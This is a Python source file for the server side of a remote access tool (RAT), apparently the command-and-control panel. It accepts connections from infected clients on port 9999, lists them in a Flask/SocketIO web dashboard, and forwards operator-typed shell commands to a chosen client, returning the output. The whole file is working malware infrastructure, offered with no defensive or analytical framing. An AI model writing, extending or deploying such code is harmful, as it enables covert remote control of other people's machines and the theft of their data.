import socket
from flask import Flask, request, render_template
from flask_socketio import SocketIO, emit
from threading import Thread

ratip = "127.0.0.1"
ratport = 9999
srvip = "127.0.0.1"
srvport = 5000

app = Flask(__name__)
socketio = SocketIO(app)

clients = []
client_id_counter = 0

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/client/<int:client_id>')
def client_page(client_id):
    if client_id < len(clients):
        return render_template('client.html', client_id=client_id, client_address=clients[client_id][1])
    else:
        return "Client not found", 404

@socketio.on('connect')
def handle_web_connect():
    emit('client_update', {'clients': [{'id': i, 'address': client[1]} for i, client in enumerate(clients)]})

@socketio.on('send_command')
def handle_send_command(data):
    command = data['command']
    client_id = int(data['id'])

    if client_id < len(clients):
        client_socket, addr = clients[client_id]
        try:
            client_socket.sendall(f"{command}\n".encode())
            output = client_socket.recv(4096).decode()
            emit('command_output', {'output': output}, room=request.sid)
        except Exception as e:
            emit('command_output', {'output': f"Error executing command: {e}"}, room=request.sid)
    else:
        emit('command_output', {'output': f"Invalid client ID: {client_id}"}, room=request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    global clients, client_id_counter

    for i, (client_socket, addr) in enumerate(clients):
        if client_socket == request.sid:
            print(f"Client disconnected: ID: {i}, Address: {addr}")
            clients.pop(i)
            break

    for new_id, (client_socket, addr) in enumerate(clients):
        socketio.emit('client_update', {'clients': [{'id': new_id, 'address': client[1]} for new_id, client in enumerate(clients)]})

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ratip, ratport))
    server.listen(5)
    print("Listening on port 9999...")

    while True:
        client_socket, addr = server.accept()
        global client_id_counter
        print(f"Connection from {addr} with ID: {client_id_counter}")
        clients.append((client_socket, addr))
        socketio.emit('client_update', {'clients': [{'id': i, 'address': client[1]} for i, client in enumerate(clients)]})
        client_id_counter += 1

if __name__ == "__main__":
    server_thread = Thread(target=start_server)
    server_thread.start()
    socketio.run(app, host=srvip, port=srvport)
